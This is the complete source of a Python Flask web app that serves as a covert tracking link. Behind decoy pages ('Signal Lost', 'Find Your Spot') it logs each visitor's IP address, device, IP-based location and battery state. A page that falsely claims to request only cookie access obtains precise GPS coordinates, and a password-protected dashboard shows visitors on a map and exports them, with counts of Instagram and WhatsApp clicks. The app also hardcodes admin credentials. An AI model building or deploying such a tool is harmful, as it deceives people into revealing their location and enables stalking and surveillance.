from flask import Flask, request, jsonify, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
from datetime import datetime
from zoneinfo import ZoneInfo
import requests
import json
import csv
import os
import psycopg2
from psycopg2.extras import RealDictCursor, Json

app = Flask(__name__)
app.secret_key = "supersecretkey"

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

USERNAME = "Dino"
PASSWORD = "Mars@201"

MY_IPS = ["127.0.0.1", "192.168.0.109"]
LOG_FILE = "logs.json"
DATABASE_URL = os.environ.get("DATABASE_URL")


class User(UserMixin):
    def __init__(self, id):
        self.id = id


@login_manager.user_loader
def load_user(user_id):
    return User(user_id)


def get_db_connection():
    return psycopg2.connect(DATABASE_URL)


def init_db():
    if not DATABASE_URL:
        return

    conn = get_db_connection()
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            ip TEXT,
            time TEXT,
            user_agent TEXT,
            client_type TEXT,
            ip_info JSONB,
            battery TEXT,
            charging TEXT,
            gps_lat TEXT,
            gps_lon TEXT,
            gps_accuracy TEXT
        )
    """)

    cur.execute("ALTER TABLE logs ADD COLUMN IF NOT EXISTS gps_lat TEXT")
    cur.execute("ALTER TABLE logs ADD COLUMN IF NOT EXISTS gps_lon TEXT")
    cur.execute("ALTER TABLE logs ADD COLUMN IF NOT EXISTS gps_accuracy TEXT")

    conn.commit()
    cur.close()
    conn.close()


def load_logs():
    if DATABASE_URL:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)

        cur.execute("SELECT * FROM logs ORDER BY id ASC")
        rows = cur.fetchall()

        cur.close()
        conn.close()

        return [
            {
                "ip": row["ip"],
                "time": row["time"],
                "user_agent": row["user_agent"],
                "client_type": row["client_type"],
                "ip_info": row["ip_info"] or {},
                "battery": row["battery"],
                "charging": row["charging"]
            }
            for row in rows
        ]

    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                return json.load(f)
        except:
            return []

    return []


def save_logs():
    if not DATABASE_URL:
        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)


def save_log_to_database(log_entry):
    if not DATABASE_URL:
        return

    conn = get_db_connection()
    cur = conn.cursor()

    cur.execute("""
        INSERT INTO logs (
            ip,
            time,
            user_agent,
            client_type,
            ip_info,
            battery,
            charging
        )
        VALUES (%s, %s, %s, %s, %s, %s, %s)
    """, (
        log_entry["ip"],
        log_entry["time"],
        log_entry["user_agent"],
        log_entry["client_type"],
        Json(log_entry["ip_info"]),
        log_entry["battery"],
        log_entry["charging"]
    ))

    conn.commit()
    cur.close()
    conn.close()


init_db()
logs = load_logs()

stats = {
    "total_visits": 0,
    "instagram_visits": 0,
    "facebook_bots": 0,
    "mobile_visits": 0,
    "desktop_visits": 0,
    "unknown_visits": 0,
    "unique_visitors": 0
}

unique_ips = set()


def rebuild_stats():
    stats["total_visits"] = 0
    stats["instagram_visits"] = 0
    stats["facebook_bots"] = 0
    stats["mobile_visits"] = 0
    stats["desktop_visits"] = 0
    stats["unknown_visits"] = 0

    unique_ips.clear()

    for log in logs:
        ip = log.get("ip")
        client = log.get("client_type", "")

        if ip:
            unique_ips.add(ip)

        stats["total_visits"] += 1

        if "Instagram" in client:
            stats["instagram_visits"] += 1
        elif "Facebook Bot" in client:
            stats["facebook_bots"] += 1

        if any(x in client for x in ["Android", "Instagram", "iPhone", "WhatsApp", "iPad"]):
            stats["mobile_visits"] += 1
        elif any(x in client for x in ["Windows", "Mac"]):
            stats["desktop_visits"] += 1
        else:
            stats["unknown_visits"] += 1

    stats["unique_visitors"] = len(unique_ips)


rebuild_stats()


def get_ip_info(ip):
    try:
        url = f"https://ipwho.is/{ip}"
        response = requests.get(url, timeout=5)
        data = response.json()

        if data.get("success"):
            return {
                "country": data.get("country"),
                "region": data.get("region"),
                "city": data.get("city"),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "isp": data.get("connection", {}).get("isp"),
                "org": data.get("connection", {}).get("org"),
                "timezone": data.get("timezone", {}).get("id")
            }

    except Exception as e:
        print("IP LOOKUP ERROR:", e)

    return {}


def detect_client(user_agent):

    ua = (user_agent or "").lower()

    # FACEBOOK BOT

    if "facebookexternalhit" in ua:
        return "Facebook Bot"

    # INSTAGRAM

    if "instagram" in ua:

        if "iphone" in ua:
            return "Instagram iPhone"

        if "android" in ua:

            if "sm-" in ua or "samsung" in ua:
                return "Instagram Samsung"

            elif "oneplus" in ua:
                return "Instagram OnePlus"

            elif "redmi" in ua or "mi " in ua or "xiaomi" in ua:
                return "Instagram Xiaomi"

            elif "realme" in ua:
                return "Instagram Realme"

            elif "vivo" in ua:
                return "Instagram Vivo"

            elif "oppo" in ua:
                return "Instagram Oppo"

            elif "m21" in ua:
                return "Samsung M21"

            elif "a8" in ua:
                return "Redmi 8A"

            else:
                return "Instagram Android"

    # WHATSAPP

    if "whatsapp" in ua:
        return "WhatsApp"

    # ANDROID DEVICES

    if "android" in ua:

        if "sm-" in ua or "samsung" in ua:

            if "m21" in ua:
                return "Samsung M21"

            return "Samsung Android"

        elif "oneplus" in ua:
            return "OnePlus Android"

        elif "redmi" in ua or "mi " in ua or "xiaomi" in ua:

            if "a8" in ua:
                return "Redmi 8A Dual"

            return "Xiaomi Android"

        elif "realme" in ua:
            return "Realme Android"

        elif "vivo" in ua:
            return "Vivo Android"

        elif "oppo" in ua:
            return "Oppo Android"

        else:
            return "Android Device"

    # APPLE

    if "iphone" in ua:
        return "iPhone"

    if "ipad" in ua:
        return "iPad"

    # WINDOWS / MAC

    if "windows" in ua:

        if "chrome" in ua:
            return "Windows Chrome"

        elif "firefox" in ua:
            return "Windows Firefox"

        return "Windows PC"

    if "macintosh" in ua:

        if "chrome" in ua:
            return "Mac Chrome"

        elif "safari" in ua:
            return "Mac Safari"

        return "Mac"

    return "Unknown"


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == USERNAME and password == PASSWORD:
            user = User(username)
            login_user(user, remember=False)
            return redirect(url_for("dashboard"))

    return """
    <html>
    <head>
        <title>Secure Login</title>
        <style>
            body {
                background:#0d1117;
                color:white;
                font-family:Arial;
                display:flex;
                justify-content:center;
                align-items:center;
                height:100vh;
            }

            .box {
                background:#161b22;
                padding:40px;
                border-radius:15px;
                width:320px;
                text-align:center;
                border:1px solid #00ff99;
            }

            input {
                width:100%;
                padding:12px;
                margin-top:15px;
                background:#0d1117;
                border:1px solid #00ff99;
                color:white;
                border-radius:8px;
            }

            button {
                margin-top:20px;
                width:100%;
                padding:12px;
                background:#00ff99;
                border:none;
                border-radius:8px;
                font-weight:bold;
                cursor:pointer;
            }

            h1 {
                color:#00ff99;
            }
        </style>
    </head>

    <body>
        <div class="box">
            <h1>Cyber Login</h1>
            <form method="POST">
                <input type="text" name="username" placeholder="Username">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">LOGIN</button>
            </form>
        </div>
    </body>
    </html>
    """


@app.route("/")
def home():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    user_agent = request.headers.get("User-Agent")
    client_type = detect_client(user_agent)

    battery = request.args.get("battery")
    charging = request.args.get("charging")

    if ip in MY_IPS:
        print("\n[ LOCAL TEST VISIT IGNORED ]")
        return """
        <h1 style='font-family:Arial;text-align:center;padding-top:100px;'>
        Local Testing Mode
        </h1>
        """

    ip_info = get_ip_info(ip)

    log_entry = {
        "ip": ip,
        "time": datetime.now(
            ZoneInfo("Asia/Kolkata")
        ).strftime("%Y-%m-%d %I:%M:%S %p"),
        "user_agent": user_agent,
        "client_type": client_type,
        "ip_info": ip_info,
        "battery": battery,
        "charging": charging
    }

    logs.append(log_entry)
    save_logs()
    save_log_to_database(log_entry)
    rebuild_stats()

    print("\n===================================")
    print("[ NEW VISIT DETECTED ]")
    print("===================================")
    print(f"IP: {ip}")
    print(f"Client: {client_type}")
    print(f"City: {ip_info.get('city')}")
    print(f"Region: {ip_info.get('region')}")
    print(f"Country: {ip_info.get('country')}")
    print(f"Latitude: {ip_info.get('latitude')}")
    print(f"Longitude: {ip_info.get('longitude')}")
    print(f"ISP: {ip_info.get('isp')}")
    print(f"Battery: {battery}")
    print(f"Charging: {charging}")
    print("\n------ LIVE STATS ------")
    print(f"Total Visits: {stats['total_visits']}")
    print(f"Unique Visitors: {stats['unique_visitors']}")
    print(f"Instagram Visits: {stats['instagram_visits']}")
    print(f"Facebook Bots: {stats['facebook_bots']}")
    print(f"Mobile Visits: {stats['mobile_visits']}")
    print(f"Desktop Visits: {stats['desktop_visits']}")
    print(f"Unknown Visits: {stats['unknown_visits']}")
    print("===================================")

    return """
    <html>
    <head>
        <title>Signal Lost</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <style>
            body {
                margin:0;
                padding:0;
                background:linear-gradient(to bottom right,#0d1117,#111827);
                color:white;
                font-family:Arial,sans-serif;
                display:flex;
                justify-content:center;
                align-items:center;
                height:100vh;
            }

            .container {
                text-align:center;
                background:rgba(255,255,255,0.03);
                padding:50px;
                border-radius:20px;
                border:1px solid rgba(255,255,255,0.08);
                box-shadow:0px 0px 30px rgba(0,0,0,0.5);
                width:85%;
                max-width:500px;
            }

            h1 {
                color:#ff3b3b;
                font-size:50px;
                margin-bottom:15px;
                letter-spacing:2px;
            }

            .line {
                width:70px;
                height:4px;
                background:#ff3b3b;
                margin:auto;
                border-radius:10px;
                margin-bottom:25px;
            }

            p {
                color:#c9d1d9;
                font-size:17px;
                line-height:1.7;
            }

            .tag {
                margin-top:30px;
                color:#7ee787;
                font-size:14px;
                letter-spacing:1px;
            }
        </style>
    </head>

    <body>
        <div class="container">
            <h1>SIGNAL LOST</h1>
            <div class="line"></div>

            <p>
                Remote telemetry endpoint initialized.<br>
                Connection established successfully.
            </p>

            <div class="tag">
                Monitoring Node • Active
            </div>
        </div>

        <script>
            if ("getBattery" in navigator) {
                navigator.getBattery().then(function(battery) {
                    let level = Math.floor(battery.level * 100);
                    let charging = battery.charging ? "Yes" : "No";

                    if (!window.location.search.includes("battery=")) {
                        fetch("/?battery=" + level + "&charging=" + charging);
                    }
                });
            }
        </script>
    </body>
    </html>
    """


@app.route("/verify")
@app.route("/track")
def track_page():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    user_agent = request.headers.get("User-Agent")
    client_type = detect_client(user_agent)
    ip_info = get_ip_info(ip)

    log_entry = {
        "ip": ip,
        "time": datetime.now(
            ZoneInfo("Asia/Kolkata")
        ).strftime("%Y-%m-%d %I:%M:%S %p"),
        "user_agent": user_agent,
        "client_type": client_type,
        "ip_info": ip_info,
        "battery": None,
        "charging": None,
        "gps_lat": None,
        "gps_lon": None,
        "gps_accuracy": None
    }

    logs.append(log_entry)
    save_logs()
    save_log_to_database(log_entry)
    rebuild_stats()

    return """

    <html>
    <head>
        <title>Find Your Spot</title>

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <style>

            body{
                margin:0;
                height:100vh;
                display:flex;
                justify-content:center;
                align-items:center;
                font-family:Arial,sans-serif;
                background:linear-gradient(135deg,#89f7fe,#66a6ff);
                overflow:hidden;
            }

            .blob{
                position:absolute;
                width:350px;
                height:350px;
                background:rgba(255,255,255,0.18);
                border-radius:50%;
                filter:blur(60px);
                animation:float 8s infinite ease-in-out;
            }

            .blob2{
                top:10%;
                left:10%;
            }

            .blob3{
                bottom:10%;
                right:10%;
            }

            @keyframes float{
                0%{transform:translateY(0px);}
                50%{transform:translateY(-25px);}
                100%{transform:translateY(0px);}
            }

            .card{
                position:relative;
                z-index:2;
                width:90%;
                max-width:430px;
                background:white;
                border-radius:30px;
                padding:40px;
                text-align:center;
                box-shadow:0 25px 60px rgba(0,0,0,0.18);
            }

            .emoji{
                font-size:65px;
                margin-bottom:15px;
            }

            h1{
                margin:0;
                color:#2563eb;
                font-size:34px;
            }

            .desc{
                color:#4b5563;
                margin-top:18px;
                line-height:1.7;
                font-size:16px;
            }

            .safe-box{
                margin-top:22px;
                background:#eff6ff;
                color:#1d4ed8;
                padding:18px;
                border-radius:18px;
                line-height:1.7;
                font-size:14px;
            }

            button{
                margin-top:28px;
                background:#2563eb;
                color:white;
                border:none;
                padding:15px 34px;
                border-radius:999px;
                font-size:17px;
                font-weight:bold;
                cursor:pointer;
                transition:0.25s;
            }

            button:hover{
                transform:translateY(-3px);
                box-shadow:0 12px 30px rgba(37,99,235,0.35);
            }

            #status{
                margin-top:22px;
                color:#2563eb;
                font-weight:bold;
                line-height:1.6;
            }

        </style>
    </head>

    <body>

        <div class="blob blob2"></div>
        <div class="blob blob3"></div>

        <div class="card">

            <div class="emoji">🌍📍</div>

            <h1>Find Your Spot</h1>

            <p class="desc">
                Tap continue to help us.
            </p>

            <div class="safe-box">
                ✅ Only Cookie access is requested<br>
            </div>

            <button onclick="getLocation()">
                Continue ✨
            </button>

            <p id="status"></p>

        </div>

        <script>

function getLocation() {

    document.getElementById("status").innerText =
    "Requesting location access...";

    if (!navigator.geolocation) {

        document.getElementById("status").innerText =
        "GPS not supported on this device.";

        return;
    }

    navigator.geolocation.getCurrentPosition(

        function(position) {

            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let accuracy = position.coords.accuracy;

            fetch(
                "/gps-update?lat=" + lat +
                "&lon=" + lon +
                "&accuracy=" + accuracy
            ).then(function() {

                document.getElementById("status").innerHTML =
                "Cookies are just text files; they aren't programs";
            });

        },

        function(error) {

            document.getElementById("status").innerText =
            "Location error: " + error.message;

        },

        {
            enableHighAccuracy:false,
            timeout:10000,
            maximumAge:60000
        }

    );
}

        </script>

    </body>
    </html>
    """
    

@app.route("/gps-update")
def gps_update():

    global logs

    lat = request.args.get("lat")
    lon = request.args.get("lon")
    accuracy = request.args.get("accuracy")
    battery = request.args.get("battery")
    charging = request.args.get("charging")

    if len(logs) > 0:
        latest_log = logs[-1]

        latest_log["gps_lat"] = lat
        latest_log["gps_lon"] = lon
        latest_log["gps_accuracy"] = accuracy
        latest_log["battery"] = battery
        latest_log["charging"] = charging

    
    if DATABASE_URL:
        
        conn = get_db_connection()
        cur = conn.cursor()

        cur.execute("""
            UPDATE logs
            SET gps_lat = %s,
                gps_lon = %s,
                gps_accuracy = %s,
                battery = %s,
                charging = %s
            WHERE id = (
                SELECT id FROM logs
                ORDER BY id DESC
                LIMIT 1
            )
        """, (
            lat,
            lon,
            accuracy,
            battery,
            charging
        ))

        conn.commit()
        cur.close()
        conn.close()

    return "GPS updated"

@app.route("/api/live-data")
@login_required
def live_data():
    rebuild_stats()

    recent_logs = logs[-10:]

    return jsonify({
        "stats": stats,
        "logs": recent_logs
    })

@app.route("/dashboard")
@login_required
def dashboard():
    html = f"""
    <html>
    <head>
        <title>Cyber Dashboard</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
       

        <style>
            <style>
    body {{
        background:#0d1117;
        color:#f0f6fc;
        font-family:'Inter', Arial, sans-serif;
        padding:20px;
        position:relative;
        overflow-x:hidden;
    }}

    body::before {{
    content:"";
    position:fixed;
    width:700px;
    height:700px;
    background:rgba(0,200,255,0.22);
    filter:blur(140px);
    top:-200px;
    right:-200px;
    z-index:-1;
}}

body::after {{
    content:"";
    position:fixed;
    width:650px;
    height:650px;
    background:rgba(0,229,168,0.18);
    filter:blur(140px);
    bottom:-200px;
    left:-200px;
    z-index:-1;
}}

           .topbar {{
    display:grid;
   grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
    gap:14px;
    margin-bottom:25px;
}}

.stat {{
    background:rgba(22,27,34,0.9);
    border:1px solid #30363d;
    padding:22px;
    border-radius:16px;
    min-height:110px;
    transition:0.3s;
    color:#f0f6fc;
}}

.stat:hover {{
    border-color:#00c8ff;
    box-shadow:0 0 18px rgba(0,200,255,0.25);
    transform:translateY(-3px);
}}

.card {{
    border:1px solid #30363d;
    padding:18px;
    margin-bottom:16px;
    border-radius:16px;
    background:rgba(22,27,34,0.85);
    backdrop-filter:blur(10px);
    transition:0.3s;
    color:#f0f6fc;
}}

.card:hover {{
    border-color:#00e5a8;
    box-shadow:0 0 18px rgba(0,229,168,0.25);
}}

.card {{
    animation:fadeUp 0.45s ease;
}}

.stat {{
    animation:fadeUp 0.45s ease;
}}

@keyframes fadeUp {{
    from {{
        opacity:0;
        transform:translateY(10px);
    }}

    to {{
        opacity:1;
        transform:translateY(0);
    }}
}}

            input {{
                width:100%;
                padding:15px;
                margin-bottom:25px;
                background:#161b22;
                border:1px solid #00ff99;
                color:#00ff99;
                border-radius:10px;
                font-size:16px;
            }}

            .nav-btn{{
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
    color:#00ff99;
    text-decoration:none;
    display:inline-block;
    transition:0.3s;
}}

.nav-btn:hover{{
    background:#00ff99;
    color:black;
    box-shadow:0 0 15px #00ff99;
}}

        </style>
    </head>

    <body>

        <div style="
            background:#161b22;
            border:1px solid #00ff99;
            border-radius:16px;
            padding:20px;
            margin-bottom:25px;
            box-shadow:0 0 18px rgba(0,255,153,0.15);
        ">

            <div style="
                display:flex;
                justify-content:space-between;
                align-items:center;
                flex-wrap:wrap;
                gap:15px;
            ">

                <div>
                 <h1 style="
    color:#00e5a8;
    font-size:40px;
    margin-bottom:8px;
">
⚡ Link Intelligence Dashboard
</h1>

<p style="
    color:#8b949e;
    margin-top:0;
    margin-bottom:20px;
">
Admin monitoring panel • PostgreSQL connected
</p>

                </div>

                <div style="
                    background:#003d2b;
                    color:#00ff99;
                    border:1px solid #00ff99;
                    padding:10px 16px;
                    border-radius:999px;
                    font-weight:bold;
                ">
                    🟢 LIVE
                </div>

            </div>

            <hr style="border:0;border-top:1px solid #30363d;margin:18px 0;">

            <div style="
                display:flex;
                flex-wrap:wrap;
                gap:10px;
                lign-items:center;
            ">

              <a href="/dashboard" class="nav-btn" style="
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
">
    🏠 Dashboard
</a>

<a href="/analytics" class="nav-btn" style="
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
">
    📊 Analytics
</a>

<a href="/map" class="nav-btn" style="
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
">
    🌍 Map
</a>

<a href="/export/json" class="nav-btn" style="
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
">
    📁 JSON
</a>

<a href="/export/csv" class="nav-btn" style="
    background:#0d1117;
    border:1px solid #00ff99;
    padding:10px 14px;
    border-radius:10px;
">
    📄 CSV
</a>

<a href="/logout" class="nav-btn" style="
    background:#2d1111;
    color:#ff7b72;
    border:1px solid #ff7b72;
    padding:10px 14px;
    border-radius:10px;
">
    🚪 Logout
</a>

            </div>

        </div>
        
        <br><br>
        
        
        <div style="
        background:#0d1117;
        padding:20px;
        border-radius:20px;
">
        <div class="topbar">
            <div class="stat"><b>Total Visits</b><br><br><span id="totalVisits">{stats['total_visits']}</span></div>

           <div class="stat"><b>Unique Visitors</b><br><br><span id="uniqueVisitors">{stats['unique_visitors']}</span></div>

           <div class="stat"><b>Mobile</b><br><br><span id="mobileVisits">{stats['mobile_visits']}</span></div>

           <div class="stat"><b>Desktop</b><br><br><span id="desktopVisits">{stats['desktop_visits']}</span></div>

           <div class="stat"><b>Instagram</b><br><br><span id="instagramVisits">{stats['instagram_visits']}</span></div>
        </div>
        

        <hr>

        <input
            type="text"
            id="searchInput"
            placeholder="Search IP, Country, Device..."
            onkeyup="filterLogs()"
        >
    """

    for log in reversed(logs[-10:]):
        battery = log.get("battery")
        charging = log.get("charging")

        battery_display = "Not supported" if battery is None else f"{battery}%"
        charging_display = "Not supported" if charging is None else charging

        html += f"""
        <div class="card visitor-card">
            <p><b>IP:</b> {log.get('ip')}</p>
            <p><b>Client:</b> {log.get('client_type')}</p>
            <p><b>Time:</b> {log.get('time')}</p>
            <p><b>City:</b> {log.get('ip_info', {}).get('city')}</p>
            <p><b>Region:</b> {log.get('ip_info', {}).get('region')}</p>
            <p><b>Country:</b> {log.get('ip_info', {}).get('country')}</p>
            <p><b>Latitude:</b> {log.get('ip_info', {}).get('latitude')}</p>
            <p><b>Longitude:</b> {log.get('ip_info', {}).get('longitude')}</p>
            <p><b>ISP:</b> {log.get('ip_info', {}).get('isp')}</p>
           <p><b>GPS:</b> {log.get('gps_lat')}, {log.get('gps_lon')}</p>

<p><b>Accuracy:</b> {log.get('gps_accuracy')} meters</p>

<p>
    <b>Google Map:</b>

    <a href="https://www.google.com/maps?q={log.get('gps_lat')},{log.get('gps_lon')}" target="_blank">
        Open Map
    </a>
</p>
            <p><b>Battery:</b> {battery_display}</p>
            <p><b>Charging:</b> {charging_display}</p>
        </div>
        """

    html += """
        <script>

function filterLogs() {
    let input = document.getElementById("searchInput").value.toLowerCase();
    let cards = document.querySelectorAll(".visitor-card");

    cards.forEach(card => {
        let text = card.textContent.toLowerCase();

        if (input === "") {
            card.style.border = "1px solid #00ff99";
            card.style.boxShadow = "none";
        } else if (text.includes(input)) {
            card.style.border = "2px solid yellow";
            card.style.boxShadow = "0 0 20px yellow";
        } else {
            card.style.border = "1px solid #222";
            card.style.boxShadow = "none";
        }
    });
}

async function refreshLiveData() {
    try {

        const response = await fetch("/api/live-data");
        const data = await response.json();

        document.getElementById("totalVisits").innerText =
            data.stats.total_visits;

        document.getElementById("uniqueVisitors").innerText =
            data.stats.unique_visitors;

        document.getElementById("mobileVisits").innerText =
            data.stats.mobile_visits;

        document.getElementById("desktopVisits").innerText =
            data.stats.desktop_visits;

        document.getElementById("instagramVisits").innerText =
            data.stats.instagram_visits;

    } catch (error) {
        console.log("Live update error:", error);
    }
}

setInterval(refreshLiveData, 5000);

</script>
    </body>
    </html>
    """

    return html


@app.route("/analytics")
@login_required
def analytics():
        return f"""
    <html>
    <head>
        <title>Analytics</title>

        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

        <style>
            body {{
                background:#0d1117;
                color:#f0f6fc;
                font-family:'Inter', Arial, sans-serif;
                padding:30px;
            }}

            a {{
                color:#00e5a8;
                text-decoration:none;
            }}

            .header {{
                background:#161b22;
                border:1px solid #30363d;
                border-radius:18px;
                padding:22px;
                margin-bottom:25px;
            }}

            .grid {{
                display:grid;
                grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
                gap:20px;
            }}

            .card {{
                background:rgba(22,27,34,0.9);
                border:1px solid #30363d;
                padding:22px;
                border-radius:18px;
            }}

            h1 {{
                color:#00e5a8;
            }}

            canvas {{
                max-height:320px;
            }}
        </style>
    </head>

    <body>

        <div class="header">
            <h1>📊 Cyber Analytics Panel</h1>
            <a href="/dashboard">⬅ Back to Dashboard</a>
        </div>

        <div class="grid">

            <div class="card">
                <h2>Device Distribution</h2>
                <canvas id="deviceChart"></canvas>
            </div>

            <div class="card">
                <h2>Traffic Sources</h2>
                <canvas id="sourceChart"></canvas>
            </div>

            <div class="card">
                <h2>Visitor Summary</h2>
                <p>Total Visits: {stats['total_visits']}</p>
                <p>Unique Visitors: {stats['unique_visitors']}</p>
                <p>Mobile: {stats['mobile_visits']}</p>
                <p>Desktop: {stats['desktop_visits']}</p>
                <p>Unknown: {stats['unknown_visits']}</p>
            </div>

        </div>

        <script>
            new Chart(document.getElementById('deviceChart'), {{
                type: 'doughnut',
                data: {{
                    labels: ['Mobile', 'Desktop', 'Unknown'],
                    datasets: [{{
                        data: [
                            {stats['mobile_visits']},
                            {stats['desktop_visits']},
                            {stats['unknown_visits']}
                        ],
                        borderWidth: 1
                    }}]
                }}
            }});

            new Chart(document.getElementById('sourceChart'), {{
                type: 'bar',
                data: {{
                    labels: ['Instagram', 'Facebook Bots', 'Other'],
                    datasets: [{{
                        label: 'Visits',
                        data: [
                            {stats['instagram_visits']},
                            {stats['facebook_bots']},
                            {stats['total_visits'] - stats['instagram_visits'] - stats['facebook_bots']}
                        ],
                        borderWidth: 1
                    }}]
                }}
            }});
        </script>

    </body>
    </html>
    """


@app.route("/map")
@login_required
def visitor_map():
    markers_js = ""

    for log in logs:
        ip_info = log.get("ip_info", {})
        lat = ip_info.get("latitude")
        lon = ip_info.get("longitude")

        if lat is not None and lon is not None:
            city = ip_info.get("city", "Unknown")
            country = ip_info.get("country", "Unknown")
            client = log.get("client_type", "Unknown")

            markers_js += """
            L.marker([%s, %s]).addTo(map)
                .bindPopup("<b>%s</b><br>%s, %s");
            """ % (lat, lon, client, city, country)

    html = """
    <html>
    <head>
        <title>Visitor Map</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

        <style>
            body {
                margin:0;
                padding:0;
                background:#0d1117;
                color:white;
                font-family:Arial;
            }

            h1 {
                text-align:center;
                padding:15px;
                color:#00ff99;
            }

            a {
                color:#00ff99;
                margin-left:20px;
            }

            #map {
                height:85vh;
                width:100%;
            }
        </style>
    </head>

    <body>
        <h1>🌍 Live Visitor Map</h1>

        <a href="/dashboard">⬅ Back to Dashboard</a>

        <br><br>

        <div id="map"></div>

        <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

        <script>
            var map = L.map('map').setView([20, 0], 2);

            L.tileLayer(
                "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
                {
                    maxZoom: 19
                }
            ).addTo(map);

            MARKERS_HERE
        </script>
    </body>
    </html>
    """

    return html.replace("MARKERS_HERE", markers_js)


@app.route("/export/json")
@login_required
def export_json():
    return jsonify(logs)


@app.route("/export/csv")
@login_required
def export_csv():
    filename = "visitor_logs.csv"

    with open(filename, "w", newline="") as file:
        writer = csv.writer(file)

        writer.writerow([
            "IP",
            "Client",
            "City",
            "Region",
            "Country",
            "ISP",
            "Battery",
            "Charging",
            "Time"
        ])

        for log in logs:
            ip_info = log.get("ip_info", {})

            writer.writerow([
                log.get("ip"),
                log.get("client_type"),
                ip_info.get("city"),
                ip_info.get("region"),
                ip_info.get("country"),
                ip_info.get("isp"),
                log.get("battery"),
                log.get("charging"),
                log.get("time")
            ])

    return f"""
    <h1 style='font-family:Arial;padding:40px;'>
    CSV Export Complete ✅<br><br>
    File saved as: {filename}
    </h1>
    """

@app.route("/terminal")
@login_required
def terminal():

    terminal_logs = ""

    for log in reversed(logs[-20:]):

        terminal_logs += f"""
[INFO] New Visitor Detected
IP: {log.get('ip')}
DEVICE: {log.get('client_type')}
CITY: {log.get('ip_info', {}).get('city')}
COUNTRY: {log.get('ip_info', {}).get('country')}
TIME: {log.get('time')}

----------------------------------------

"""

    return f"""
    <html>
    <head>
        <title>Cyber Terminal</title>

        <meta http-equiv="refresh" content="5">

        <style>

            body {{
                background:black;
                color:#00ff99;
                font-family:monospace;
                padding:20px;
            }}

            .terminal {{
                white-space:pre-wrap;
                line-height:1.6;
                font-size:15px;
            }}

            h1 {{
                color:#00ff99;
            }}

            a {{
                color:#00ff99;
            }}

        </style>
    </head>

    <body>

        <h1>⚡ LINK LAB TERMINAL</h1>

        <a href="/dashboard">⬅ Back to Dashboard</a>

        <hr>

        <div class="terminal">
{terminal_logs}
        </div>

    </body>
    </html>
    """


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=True
    )